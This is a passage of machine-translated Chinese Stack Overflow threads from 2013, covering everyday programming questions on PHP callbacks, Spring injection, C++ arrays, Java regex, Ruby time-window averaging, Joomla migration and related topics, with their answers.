“进位位”是位于 MSB 旁边的位，不再位于变量本身中。所以说你的五位变量中的“第六位”。它的初始值为 0：

```
0 01010
0 11011 +
---------
1 00101 = 
```

但是结果值是 1。所以你“执行”了一个 1。这可以被计算机使用，即检测这样的溢出。

如果您需要更多详细信息，请告诉我。

# javascript - ECMA262 和 ISO/IEC 16262 之间的实际区别

> ID：15244453
> 
> 赞同：2
> 
> 时间：2013-03-06T10:13:34.160
> 
> 标签：javascript, standards

有谁知道这两个标准之间的区别是什么（实际上它们看起来相当）？

谢谢。

更准确地说，我从他们的网站下载了这两个文件，如果你阅读索引，它们似乎是等价的

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:24:13.220

ISO 文档（[在此处](http://webstore.iec.ch/preview/info_isoiec16262%7Bed3.0%7Den.pdf)预览）包括以下文本：

> 目前 ISO/IEC 16262 第三版（作为 ECMA-262 第五版发布）

这意味着它们是相同的文本。

[ECMA-262 页面](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf)也这样说：

> ECMAScript 标准 5.1 版与国际标准 ISO/IEC 16262:2011 的第三版完全一致。

因此，唯一的实质性区别似乎是 ISO 将向您收取 238 瑞士法郎的副本费用，但 ECMA 将免费提供给您。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-22T17:07:27.693

262 只是 Ecma General Assembly 给出的标识符，而 16262:XXXX 是 ISO/IEC 给出的标识符（其中 XXXX 是修订年份）。

因此，这两个文件代表相同。

*   ECMA-262 第 1 版由 ISO/IEC 发布为 16262:1998。
*   ECMA-262 第 2 版由 ISO/IEC 发布为 16262:2002。
*   ECMA-262 第三版由 ISO/IEC 发布为 16262:2011。
*   ECMA-262 第 5 版和 ECMA-402 和 ISO/IEC 21778:2017 等其他标准已被 ISO/ICE 称为 ISO/IEC 22275:2018。

您可以查看由 Ecma 管理的标准列表，带有 Ecma id 和 ISO/IEC id： [https ://www.ecma-international.org/publications/standards/Standard.htm](https://www.ecma-international.org/publications/standards/Standard.htm)

# joomla - Joomla 从 1.5 迁移到 2.5

> ID：15244454
> 
> 赞同：0
> 
> 时间：2013-03-06T10:13:34.667
> 
> 标签：joomla, migration, joomla2.5, joomla1.5

我正在借助一个名为 jUpgrade 的组件将我的一个网站从 Joomla 1.5 迁移到 2.5 版本。我的 Joomla 1.5 安装了以下组件

Artio JoomSEF

Akeeba 备份

医生

寄存器

JCE管理

j评论

杰文茨

Joomla 包

j视频

Lyften 博客

Phoca SEF

天达

美德

地图

所以我也想迁移这些组件。

现在我已经使用 jUpgrade 进行了迁移，它已经迁移了所有核心组件和文件。它还复制了模板。我正在使用龙门架，我的默认模板是 rt_mercado_j15。但是，这些模板并未显示在模板管理器中。另外如何将第三方组件迁移到新站点，否则我会丢失数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-06T12:01:36.850

JUpgrade 仅更新 Joomla 核心。您必须自己更新扩展。

升级前的步骤：

*   检查您是否拥有最新的 1.5 版本 (1.5.25)
*   检查所有扩展是否都有 2.5 版本可用（[http://extensions.joomla.org/](http://extensions.joomla.org/)）
*   检查您的模板是否在 2.5 中可用
*   备份您的 Joomla 安装和数据库（例如使用 XCloner 或 Akeeba Backup）
*   尝试使用相同的扩展更新测试安装（例如，您可以从备份中运行本地版本并查看它是否有效）

请访问[Joomla 文档迁移指南](http://docs.joomla.org/Migrating_from_Joomla_1.5_to_Joomla_2.5)了解更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:30:08.037

JUpgrade 仅更新核心 Joomla 文件、扩展和数据库表。它不做第 3 方扩展或模板，因此您必须下载每个 Joomla 2.5 兼容版本。

# php - OOP中的php uasort

> ID：15244455
> 
> 赞同：2
> 
> 时间：2013-03-06T10:13:35.170
> 
> 标签：php, sorting

```
class DBNews {

    public function get_latest_posts($limit){

        // code goes here

        $posts_array = array();
        uasort($posts_array, $this->cmp);

    }

    public function cmp($a, $b) {
        if ($a == $b) {
            return 0;
        }

        return ($a < $b) ? -1 : 1;
    }
} 
```

我收到以下警告：

```
Warning: uasort() expects parameter 2 to be a valid callback, 
no array or string given in 
C:\xampp\htdocs\news\admin\functions.php on line 554. 
```

第 554 行包含`uasort($posts_array, $this->cmp)`.

在哪里使用字符串或数组以及以什么方式使用？

**编辑**：如果我使用`uasort($posts_array, array($this, 'cmp'));`，我会收到以下警告：

```
uasort() expects parameter 2 to be a valid callback,
array must have exactly two members in
C:\xampp\htdocs\news\admin\functions.php on line 554 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-06T10:15:43.667

你必须这样称呼它：

```
uasort($posts_array, Array ( $this, 'cmp'); 
```

以下链接解释了如何在 PHP 中构造一个有效的回调：[http ://www.php.net/manual/en/language.types.callable.php](http://www.php.net/manual/en/language.types.callable.php)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-06T10:15:49.313

```
uasort($posts_array, array($this, 'cmp')); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-03-06T10:25:53.537

如果你有 >= 5.3 并且你没有在任何其他函数中使用 compare 方法，你也可以使用闭包：

```
uasort($posts_array, function($a, $b) {
    if ($a == $b) {
        return 0;
    }

    return ($a < $b) ? -1 : 1;
}); 
```

# spring - Spring 无法使用 @Resource 实例化 bean

> ID：15244458
> 
> 赞同：0
> 
> 时间：2013-03-06T10:13:54.013
> 
> 标签：spring, dependency-injection, resources, inversion-of-control, javabeans

我正在运行这段小代码。

```
public class TestIOC {

@Resource
University university;

public static void main(String[] arg)
{
    ApplicationContext context =
        new ClassPathXmlApplicationContext("service.xml");
    TestIOC ioc = new TestIOC();
    //ioc.university = (University)context.getBean("university");
    System.out.println(ioc.university);
}
} 
```

这是我的 service.xml 文件。

```
<context:annotation-config />
<bean id="university" class="com.test.beans.University">
    <constructor-arg type = "int" value="1"   />
    <constructor-arg type = "java.lang.String" value="Some University"   />
    <constructor-arg type = "java.lang.String" value="Some City"   />

</bean> 
```

如果我评论了 context.getBean("university"); 我无法打印大学的价值观。但使用 context.getBean("university"); 我能够打印输出。

我正在使用@Resource，但我仍然需要 getBean 方法来注入 bean。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:20:36.893

这是因为`TestIOC`不是由spring管理的。如果你想`@Resource`工作，那么你需要为它创建一个 bean`TestIOC`并使用它。

将以下 bean 添加到 service.xml

```
<bean id="testIOC" class="TestIOC"></bean> 
```

然后在java中像这样使用它

```
TestIOC ioc = context.getBean(TestIOC.class);
System.out.println(ioc.university); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:29:54.387

绝对是因为你没有在 Spring 上下文中配置 TestIOC 类，所以 Spring 对此无能为力。您应该将其作为 bean 添加到 service.xml。还有一件事与这个问题无关，我想提一下，如果你使用`<Context:annotation-config>`和使用`@Resource`来注入bean，那么bean 必须在xml 中配置，而不是带有Component 的注释bean。有时它与`<context:component-scan/>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:37:21.513

## @资源

```
Indicates that a method or field should be injected with a 
named resource (by default, another bean). 
```

在您的情况下，Spring 将尝试将“university”属性与对 ID 为“university”的 bean 的引用联系起来。

# java - iSeries 上 Java 应用程序的推荐位置

> ID：15244460
> 
> 赞同：2
> 
> 时间：2013-03-06T10:14:02.093
> 
> 标签：java, ibm-midrange

我有一个 Java 应用程序，我将使用 CommandCall 远程调用它。

目前我已经将它放在`/home/username`文件夹中，并在 JAVA 命令的 CLASSPATH 参数中指定该文件夹。

但现在我必须将应用程序发送给客户，看来这些是可能的位置

*   在根目录下创建目录，例如`/myapp`
*   在 QOpenSys 中创建目录，例如`/QOpenSys/myapp`. [这篇 ITJungle 文章](http://www.itjungle.com/fhg/fhg032206-story02.html)中大致提到了这一点

但是我没有在 iSeries 文档中找到推荐的位置。

那么在 iSeries 上部署 Java 应用程序的推荐位置是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T13:27:12.627

请参阅 IFS 路径组织的[文件系统层次结构标准](https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard)。

我更喜欢部署到诸如`/opt/<application>`或之类的路径`/opt/<vendor>/<application>`。我还在该结构中创建环境目录，例如`test`, `dev`,`prod`等。

请注意，`/opt`它位于不区分大小写的文件系统上。如果这是一个问题，您也可以使用`/QOpenSys/opt`.

我建议不要创建任何新的根目录。

# c++ - 引用数组的第二维

> ID：15244467
> 
> 赞同：0
> 
> 时间：2013-03-06T10:14:13.190
> 
> 标签：c++, arrays, pointers, reference

我有这个类和它的对象的二维数组：

```
class Foo
{
public:
    Foo(int x)
    {
        value = x;
    }
    int value;
};

Foo foo1(1), foo2(2), foo3(3), foo4(4);
Foo* fooArray1[4][2] = { {&foo1, &foo2}, {&foo2, &foo3}, {&foo3, &foo4}, {&foo4, &foo1} }; 
```

现在我想引用这个数组的第二维。不知何故：

```
Foo* fooArray3[2] = fooArray1[2]; 
```

但是我的编译器一直告诉我：

```
Unallowed Assignment »Foo* (*)[2]« to »Foo* [2]« 
```

我工作的唯一版本是：

```
Foo** fooArray2 = fooArray1[3]; 
```

但是对于这个版本，我必须使用星号运算符访问 fooArray2，我不想这样做：

```
cout << "fooArray2[0]: " << (*fooArray2)[0].value << " fooArray2[1]: " << (*fooArray2)[1].value << endl; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:24:37.953

看来您想要**指向数组的指针**。的第 2 维`fooArray1`构成 2 个元素。有一个特殊的语法如下：

```
Foo *(*fooArray3)[2] = &fooArray1[2];  // compiles 
```

上面的语法意味着：`fooArray3`是一个*指向 2 个`Foo`元素*数组的指针。

但是我相信你可能不想要这么复杂的语法。你应该改变你的设计，你可以用简单的数据类型或`std`容器来保存数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:29:29.087

我想你想要的是这样的：

```
Foo* (&fooArray3)[2] = fooArray1[3];
std::cout << fooArray3[0]->value; // Prints 4 
```

但是，如果您使用的是 C++11，生活会更加愉快：

```
auto& fooArray3 = fooArray1[3];
std::cout << fooArray3[0]->value; // Prints 4 
```

**编辑：**根据要求：

```
Foo* (*fooArray3)[2];
⋮
fooArray3 = &fooArray1[3];
std::cout << (*fooArray3[0])->value; 
```

# asp.net - 长文本的 GridView 单元格文本格式

> ID：15244471
> 
> 赞同：0
> 
> 时间：2013-03-06T10:14:22.447
> 
> 标签：asp.net, gridview

asp.net 的 GridView 中是否有任何属性可以显示大/长文本数据，就像我的数据是“我的名字是 Raj，我是印度人”，并且这个文本将显示在 gridview 的单元格中，就像我的名字是 Ra...当用户鼠标悬停时，它会在工具提示中显示全文

asp.net gridview 中是否有任何预定义的属性，或者我需要为它编写手动代码？任何建议表示赞赏...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:38:42.220

在我完成此操作的地方，我使用了 TemplateField 和自定义代码，例如

标记：

```
<asp:Templatefield>
    <ItemTemplate>
        <asp:Label runat="server" id="MyLabel" />
    </ItemTemplate>
</asp:Templatefield> 
```

代码隐藏：

```
private void GridView_OnRowDataBound(object sender, GridViewRowEventArgs e)
{
    // Get hold of the string we want to bind
    DataRowView rowView = (DataRowView)e.Row.DataItem;
    string longString = rowView["LongString"].ToString();

    Label MyLabel = (Label)e.Row.FindControl("MyLabel");

    // If the string is less than 20 characters, just bind it
    if (longString.Length() < 20)
    {
        MyLabel.Text = longString;
    }
    else
    {
        // If the string is more than 20 characters, bind the first
        // 17 characters plus an ellipsis, and bind the whole string
        // into the tooltip
        MyLabel.Text = String.Format("{0}...", longString.SubString(0,17);
        MyLabel.Tooltip = longString;
    }
} 
```

# java - Java2ME 中的 IPv6 支持

> ID：15244477
> 
> 赞同：0
> 
> 时间：2013-03-06T10:14:33.310
> 
> 标签：java, java-me

Sun 的 Java ME SDK 似乎不支持 IPv6。我对吗？我从 javax.microedition.io.SocketConnection 描述中得出了这样的结论：

> ..主机可以指定为完全限定的主机名或 IPv4 编号..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:25:17.220

JavaME的[Foundation Profile 1.1.2](http://docs.oracle.com/javame/config/cdc/ref-impl/fp1.1.2/jsr219/index.html)支持 IPv6 。它被列为新功能之一，如果您在`java.net`包中查看，则有一个`Inet6Address`类。

因此，如果您需要 IPv6，您可能需要升级您的 JavaME 平台。但请注意，FP 1.1.2 Javadoc 的版权日期是 2006 年……再深入一点就会发现 IPv6 的更改实际上是在 FP 1.1 中进行的，最终于 2004 年 8 月 2 日完成。从这个角度来看，任何带有 FP 且不支持 IPv6 的 JavaME 平台都已经过时了 9 年多。

也许是这样的......

![有老派手机的老派家伙](../Images/6f0f9d04e8c57011622942c1d09854b0.png)

* * *

> 那么 MIDP 2 配置文件呢？

MIDP 2.0 支持 IPv6；请参见[此处](http://docs.oracle.com/javame/config/cldc/ref-impl/midp2.0/jsr118/javax/microedition/io/package-summary.html#package_description)...并在页面中搜索“IPv6”。（我不知道这是否能保证 MIDP 2.0 的每个实现都支持 IPv6，但如果您的供应商不支持……那么可能是时候放弃它们了。）

# ruby-on-rails - 如何计算数组中15分钟范围内的数据？

> ID：15244478
> 
> 赞同：1
> 
> 时间：2013-03-06T10:14:57.567
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我有一组时间段和值：

```
2013-03-04 02:00:00 UTC
2013-03-04 02:01:00 UTC
2013-03-04 02:02:00 UTC
2013-03-04 02:03:00 UTC
2013-03-04 02:04:00 UTC
2013-03-04 02:05:00 UTC
2013-03-04 02:06:00 UTC
2013-03-04 02:07:00 UTC
2013-03-04 02:08:00 UTC
2013-03-04 02:09:00 UTC
2013-03-04 02:10:00 UTC
2013-03-04 02:11:00 UTC
2013-03-04 02:12:00 UTC
2013-03-04 02:13:00 UTC
2013-03-04 02:14:00 UTC
2013-03-04 02:15:00 UTC
2013-03-04 02:16:00 UTC
2013-03-04 02:17:00 UTC
2013-03-04 02:18:00 UTC
2013-03-04 02:19:00 UTC
2013-03-04 02:20:00 UTC
2013-03-04 02:21:00 UTC
2013-03-04 02:22:00 UTC
2013-03-04 02:23:00 UTC
2013-03-04 02:24:00 UTC
2013-03-04 02:25:00 UTC
2013-03-04 02:26:00 UTC
2013-03-04 02:27:00 UTC
2013-03-04 02:28:00 UTC
2013-03-04 02:29:00 UTC
2013-03-04 02:30:00 UTC 
```

每个时间段都有自己的浮点数值。就像：

```
1.192069669
1.398097386
1.51857279
1.667887277
1.919998368
2.007405113
2.079283295
2.160574819
2.184922836
2.194639015
2.234917032
2.278915283
2.307196654
2.265553703
2.209039541
2.204034995
2.271997186
2.192411672
2.268617205
2.136996194
2.20568788
2.202653527
2.186529626
2.206325387
2.182503664
1.196174184
1.206075579
1.226468123
1.177213548
1.060684314
1.215226185
1.268223732
1.334227719
1.503234406
1.699964124
1.680645046
1.767723116
1.733957416
1.79358097
1.847852493
1.918378765
1.95619668
1.900485186
1.908825891
2.138246816
2.170221961
2.131884782
2.140921904
2.171028766
2.392254099
2.497088696 
```

# 问题是：

我需要总结每 15 分钟的值并取它们的算术平均值。

例如 02:00 和 02:14 之间的数据是第一组 02:15 和 02:29 是第二组。02:30 和 02:44 .....

我需要每组的平均值。

必须使用`for`或`while`使用 15.minutes 时间助手来完成，但我无法使其工作。

如何处理这些？

谢谢你。

## 编辑：

数组结构是这样的：

```
ras_date                   tv1_rating              tv2_rating             tv3_rating
------------------------------------------------------------------------------------
2013-03-04 02:00:00 UTC   |  2.184922836     |   2.278915283     |     2.278915283
2013-03-04 02:01:00 UTC   |  2.194639015     |   3.278915283     |     1.278915283
2013-03-04 02:02:00 UTC   |  0.234917032     |   4.278915283     |     0.278915283
2013-03-04 02:03:00 UTC   |  2.278915283     |   1.278915283     |     2.278915283
..
. 
```

我想根据 ras_date 计算每个电视台 15 分钟的平均收视率。

好吧，使用 for 和 while 只是我的一个猜测。欢迎任何类型的解决方案。谢谢你。

## 编辑2：

```
[#<DataFile id: 48009, timeband: \"02:00\", ras_date: \"2013-03-04 02:00:00\", created_at: \"2013-03-05 18:45:16\", updated_at: \"2013-03-05 18:45:16\", tv1_rtg: 0.231275974, tv1_shr: 3.459938790606675, tv2_rtg: 0.465407082, tv2_shr: 6.9625910058208715, tv4_rtg: 0.024855499, tv4_shr: 0.3718436621954748, tv5_rtg: 0.355105523, tv5_shr: 5.3124557321564705, tv3_rtg: 0.306065103, tv3_shr: 4.578800400255703, tv6_rtg: 0.425388078, tv6_shr: 6.363898016202141, tv8_rtg: 0.184050299, tv8_shr: 2.7534324379620037, tv7_rtg: 0.13351472, tv7_shr: 1.9974092027604597, tv8_rtg: 0.104982397, tv8_shr: 1.5705594551346256, ttv_rtg: 6.684394956, ttv_shr: 100.0, tv9_shr: 3.8946589139877266, tv9_rtg: 0.260334384>, #<DataFile id: 48010, timeband: \"02:01\", ras_date: \"2013-03-04 02:01:00\", created_at: \"2013-03-05 18:45:16\", updated_at: \"2013-03-05 18:45:16\", tv1_rtg: 0.111862045, tv1_shr: 1.6818552137556582, tv2_rtg: 0.464504362, tv2_shr: 6.983861979654901, tv4_rtg: 0.057792275, tv4_shr: 0.8689116940741676, tv5_rtg: 0.353541524, tv5_shr: 5.315526418442655, tv3_rtg: 0.315364133, tv3_shr: 4.741526147833099, tv6_rtg: 0.463173951, tv6_shr: 6.963859138863031, tv8_rtg: 0.188181065, tv8_shr: 2.8293180703101073, tv7_rtg: 0.148338388, tv7_shr: 2.2302800852416897, tv8_rtg: 0.112267205, tv8_shr: 1.6879468282832242, ttv_rtg: 6.651110279, ttv_shr: 100.0, tv9_shr: 3.673313247735431, tv9_rtg: 0.244316115>, #<DataFile id: 48011, timeband: \"02:02\", ras_date: \"2013-03-04 02:02:00\", created_at: \"2013-03-05 18:45:16\", updated_at: \"2013-03-05 18:45:16\", tv1_rtg: 0.096118706, tv1_shr: 1.4904838004557073, tv2_rtg: 0.482073193, tv2_shr: 7.475363690398179, tv4_rtg: 0.045212074, tv4_shr: 0.7010900030427445, tv5_rtg: 0.367055659, tv5_shr: 5.691821460903709, tv3_rtg: 0.336406586, tv3_shr: 5.2165555245782205, tv6_rtg: 0.463173951, tv6_shr: 7.18229884158621, tv8_rtg: 0.175622569, tv8_shr: 2.72332623879596, tv7_rtg: 0.13351472, tv7_shr: 2.0703725171079563, tv8_rtg: 0.109862708, tv8_shr: 1.7036078965544506, ttv_rtg: 6.448825943, ttv_shr: 100.0, tv9_shr: 4.214133803611018, tv9_rtg: 0.271762154>, #<DataFile id: 48012, timeband: \"02:03\", ras_date: \"2013-03-04 02:03:00\", created_at: \"2013-03-05 18:45:16\", updated_at: \"2013-03-05 18:45:16\", tv1_rtg: 0.111568925, tv1_shr: 1.7336392363465083, tv2_rtg: 0.589141334, tv2_shr: 9.154507246313642, tv4_rtg: 0.100518614, tv4_shr: 1.5619314537051374, tv5_rtg: 0.402849844, tv5_shr: 6.259774358446762, tv3_rtg: 0.328333577, tv3_shr: 5.101886315541693, tv6_rtg: 0.43495935, tv6_shr: 6.758715254949115, tv8_rtg: 0.175622569, tv8_shr: 2.7289514208940524, tv7_rtg: 0.13351472, tv7_shr: 2.0746489869093736, tv8_rtg: 0.102741203, tv8_shr: 1.5964676607777801, ttv_rtg: 6.435532991, ttv_shr: 100.0, tv9_shr: 1.7713521655381412, tv9_rtg: 0.113995953>] 
```

## 编辑3：

我的数组文件如上所示（见edit-2）。

当我尝试时：

```
d = DataFile.all
d.each_slice(15) { |v| puts v.inject(0.0) { |sum, el| sum + el } /  v.size } 
```

我得到这个错误：

```
TypeError: DataFile can't be coerced into Float
    from (irb):31:in `+'
    from (irb):31:in `block (2 levels) in irb_binding'
    from (irb):31:in `each'
    from (irb):31:in `inject'
    from (irb):31:in `block in irb_binding'
    from (irb):31:in `each'
    from (irb):31:in `each_slice'
    from (irb):31 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:25:19.630

您已经有了一个想要计算的值数组`slice`并`15`找到一个中位数。忘记分钟，然后：

```
vals.each_slice(15) { |v|
 puts v.inject(0.0) { |sum, el| sum + el } / v.size
} 
```

`each_slice`这里的方法是将一个数组切成 15 个元素。根据代码块`inject`遍历元素并聚合 中的值。`sum`代码块必须返回要聚合的值。希望能帮助到你。

如果您在数组中有复杂的值（例如`Hash`，），您将得到`sum`您真正想要求和的值：

```
vals.each_slice(15) { |v|
  puts v.inject(0.0) { |sum, el| sum + el.tv1_rtg } / v.size
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T05:02:29.377

它将 0 到 14 分钟的时间分成 15 分钟组，将 15 到 29 分钟的 timw 分成 30 分钟组，依此类推。对于每组，取平均值。

这是一个工作代码：

```
require 'date'
a = Hash.new
d = DataFile.all
d.each do |dd|
        a[dd.ras_date.to_s] = [dd.tv1_rtg, dd.tv2_rtg, dd.tv3_rtg, dd.tv4_rtg, dd.tv5_rtg, dd.tv6_rtg, dd.tv7_rtg, dd.tv8_rtg, dd.tv9_rtg, dd.ttv_rtg]
end

number_of_ratings = 10

b = Hash.new
c = Hash.new
a.each do |k,value|
        aa = DateTime.parse(k)
        k_round = (aa + Rational(((aa.min/15+1)*15-aa.min)*60-aa.sec,86400)).to_s
        if b.has_key?(k_round)
        else
                b[k_round] = Array.new(number_of_ratings){|i| 0}
                c[k_round] = 0
        end
        b[k_round] = b[k_round].zip(value).map{|pair| pair.reduce(&:+) }
        c[k_round] = c[k_round]+1
end
b.each do |key,value|
        if c[key]!=0
                n_array = Array.new(number_of_ratings){|i| c[key]}
                b[key] = b[key].zip(n_array).map{|pair| pair.reduce(&:/) }
                p "#{key} => #{b[key]}"
        end
end 
```

## **编辑：**

```
k_round = (aa + Rational(((aa.min/15+1)*15-aa.min)*60-aa.sec,86400)).to_s 
```

`aa`是一个日期时间对象。

`Rational`是在数学中产生有理数的函数。有理数(3,4) = 3/4

`to_s`是将数字（浮点数、整数、任意数字）转换为字符串的函数。

一天有86400秒。

此表达式`((aa.min/15+1)*15-aa.min)*60-aa.sec`将分钟部分四舍五入为 15 整数倍，并将第二部分重置为 0。

将 34.45 向上舍入为 15 的倍数的简单示例是：

34/15 = 2.26，四舍五入为 3。现在，将其乘以 15，即为 45。

时间的第二部分是 45。因此，将其重置为零。

因此，我们以小时为单位添加时间，因此我们使用`Rational`函数将秒转换为小时。

您可以使用 5、30 和 60 分钟，例如：

```
integral_multiple = 5
k_round = (aa + Rational(((aa.min/integral_multiple+1)*integral_multiple-aa.min)*60-aa.sec,86400)).to_s 
```

# c++ - 对象数组 c++

> ID：15244479
> 
> 赞同：0
> 
> 时间：2013-03-06T10:14:58.240
> 
> 标签：c++, arrays, object

我需要在 C++ 中创建一个包含 20 个对象的数组，因为我需要全部操作它们才能在 OpenGL 中绘制它们。

我试过了：

```
Animal::Cat *_listCats[20]; 
```

然后我需要用坐标初始化它们。我有一个构造函数和一个 Seter

```
Cat(float _x, float _y) :
 _xOffSet(_x), _yOffSet(_y) {}

void CatCoordinates(float x, float y){
_xOffSet = x;
_yOffSet = y;
    } 
```

我有一个在 OpenGL 中绘制猫的方法

```
void DrawCat() 
{
...do things...
 } 
```

Cat 是命名空间 Animal 中的一个特定类，我从另一个文件调用。问题是我有 sigsevs，我不知道如何创建 20 只猫并用 cicles 有效地绘制它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:18:08.253

如果你想要一个对象数组`20`，你可以使用[`std::array`](http://en.cppreference.com/w/cpp/container/array)：

```
#include <array>

std::array<Animal::Cat, 20> listCats_; // leading _ reserved for implementation 
```

如果没有 C++11 支持，可以使用 TR1 版本：

```
#include <tr1/array>

std::tr1::array<Animal::Cat, 20> listCats_; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:18:29.757

该数组*只是*一个*指针*数组。它有 20 个指向`Animal::Cat`. 它没有给你任何`Animal::Cat`指向的对象，并且指针没有指向任何地方。要让它们指向实际`Animal::Cat`对象，您需要`new Animal::Cat()`为每个指针元素执行并分配它们：

```
for (int i = 0; i < 20; i++) {
  _listCats[i] = new Animal::Cat();
} 
```

该`new`表达式动态分配一个`Animal::Cat`对象并为您提供指向它的指针，然后您可以将其分配给数组中的指针。

但是，最好不要使用动态分配的内存。只需将其更改为：

```
Animal::Cat _listCats[20]; 
```

这为您提供了一系列 20`Animal::Cat`秒 - 您可以立即开始使用的真实物品。

或者，您可以使用 C++ 标准库中的容器更加安全。在`std::array<Animal::Cat, 20>`这里会很完美。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:50:37.403

是否特别需要正好 20 名成员？您可以使用法线向量来存储您的对象，并让它根据需要增长。我认为不需要确切的数字。

此外，在某些编译器下，您会错过 std::array，因此 vector 可能没问题。优点是，从文件中或基于某个配置文件读取每个猫数据会更容易。

```
 #include <vector>

    std::vector<Animal::Cat *> cats;

    void createCats()
    {
      using namespace Animal;

      Cat *cat1 = new Cat(1, 2);
      // load image or some data maybe?
      cats.push_back(cat1);

      Cat *cat2 = new Cat(3,4);
      cats.push_back(cat2);

      // unless data loading is needed.
      cats.push_back(new Cat(5,6));
      cats.push_back(new Cat(7,8));
    }

    void DrawAllCats()
    {
      for (unsigned i=0; i< cats.size(); i++) {
        cats[i]->DrawCat();
      }
    }

    // because cats are allocated dynamically, they will not be destroyed on vector destructor.
    // use delete or smart pointers (std::auto_ptr)
    void destroyCats()
    {
      for (unsigned i=0; i<cats.size(); i++) {
        delete cats[i];
        cats[i] = NULL;
      }
    } 
```

我建议你学习一点 C++ 对象，它与 Java 等语言不同。只有指定一个时才有引用，对象可以被复制、通过引用传递或通过指针指向。

例如，您可以使用 std::vector 猫。但是你应该定义没有参数的构造函数。见[http://www.cplusplus.com/doc/tutorial/pointers/](http://www.cplusplus.com/doc/tutorial/pointers/)

# java - Pattern.matcher(s).replaceAll("$1$2$3") 仅将 $2 转换为小写

> ID：15244483
> 
> 赞同：0
> 
> 时间：2013-03-06T10:15:04.020
> 
> 标签：java, regex

我有一个这样的字符串

> final String *text* = "Some Text #AAAA some Other text .." (# 有 4 个大写字母)

```
Pattern patt = Patter.compile("(.*?)(#)([A-Z]{4})(.*?)");
patt.matcher(text ).replaceAll("$1$3$4") 
```

只删除 我会用小写字母*AAAA*`#`的in*文本* ，预期结果：

 *> 一些文字*aaaa*一些其他文字..

这个结果如何以小写形式出现，仅适用于四个*AAAA*？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:32:53.787

而不是`replaceAll`直接使用，你必须自己做`appendReplacement`循环。我会使用更简单的正则表达式：

```
Pattern patt = Patter.compile("#([A-Z]{4})");
Matcher mat = patt.matcher(text);
StringBuffer buf = new StringBuffer();
while(mat.find()) {
  mat.appendReplacement(buf, mat.group(1).toLowerCase());
}
mat.appendTail(buf); 
```

通常，如果替换字符串可能包含符号或反斜杠，您必须注意`appendReplacement`(and `replaceAll`) 并使用，但在这种情况下，我们知道这不会发生，因为第 1 组总是正好是四个字母。`Matcher.quoteReplacement``$`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:25:00.667

这将起作用：

```
Matcher matcher = patt.matcher(text);
matcher.matches();
String res = matcher.group(1) + matcher.group(3).toLowerCase() + matcher.group(4); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:27:10.637

这是一个单行：

```
String text2 = text.replaceFirst("(?<=#)[A-Z]{4}", text.replaceAll(".*?#([A-Z]{4}).*", "$1").toLowerCase()); 
```

举个例子：

```
final String text = "Some Text #AAAA some Other text ..";
        String text2 = text.replaceFirst("(?<=#)[A-Z]{4}", text.replaceAll(".*?#([A-Z]{4}).*", "$1").toLowerCase());
        System.out.println(text2); 
```

将输出：

```
Some Text #aaaa some Other text .. 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-06T10:31:44.127

试试这个 ：

```
public static void main (String args[]) {
    String matched = "";
    Pattern pattern = Pattern.compile("(.*?)(#)([A-Z]{4})(.*?)");
    Matcher matcher = pattern.matcher("Some Text #AAAA some Other text");
    if (matcher.find()) {   
        matched =  matcher.group(1) + matcher.group(3).toLowerCase() + matcher.group(4);
    }
    System.out.println(matched);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-06T10:28:43.333

从[`Matcher.replaceAll()`API 页面](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Matcher.html#replaceAll%28java.lang.String%29)引用：

> 请注意，替换字符串中的反斜杠 ( `\`) 和美元符号 ( `$`) 可能会导致结果与将其视为文字替换字符串时的结果不同。美元符号可以被视为对捕获的子序列的引用。

这听起来就像你面临的问题......*

# html - Rails 渲染自定义

> ID：15244484
> 
> 赞同：0
> 
> 时间：2013-03-06T10:15:08.167
> 
> 标签：html, ruby-on-rails

我是一名网页设计师，目前正在处理我的设计在 Rails Web 应用程序中的实现。

我目前在此代码上遇到问题。

```
<%= render 'letterhead_link' %> 
```

它当前输出：

```
<a href="/letterheads/2/edit">Edit Letterhead</a> 
```

我假设“编辑信头”链接更改为创建，如果用户还没有信头，因为每个用户只能有一个信头。

我尝试在控制器中搜索此“letterhead_link”，但找不到任何东西。

所以，我不确定，但有什么方法可以自定义它以获得这样的输出？

```
<a href="/letterheads/2/edit" class="letterhead"><span class="icon"></span>Letterhead</a> 
```

我确实需要额外的标签来将图标与链接合并。我希望这里有人可以帮助我。

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:36:30.007

如果 `<%= render 'letterhead_link' %>` 给出这样的输出

`<a href="/letterheads/2/edit">Edit Letterhead</a>`

然后，尝试以下操作以获得您想要的东西，

```
<%= render 'letterhead_link', class: 'letterhead' do %>
  <span class="icon"></span>
